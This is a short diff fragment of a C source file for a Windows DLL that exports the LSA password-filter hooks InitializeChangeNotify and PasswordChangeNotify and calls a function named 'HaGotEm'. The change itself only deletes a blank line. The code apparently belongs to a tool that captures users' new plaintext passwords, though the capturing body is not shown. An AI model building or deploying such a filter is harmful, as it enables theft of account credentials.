@@ -45,7 +45,6 @@ void _() {
     HaGotEm(NULL, 0, NULL, 0, NULL);
 }
 __declspec(dllexport) BOOL NTAPI InitializeChangeNotify(void) { return TRUE; }
-
 BOOL WINAPI DllMain(HINSTANCE hiDLL, DWORD dwReason, LPVOID lpReserved) { return TRUE; }
 
 __declspec(dllexport) NTSTATUS NTAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) {
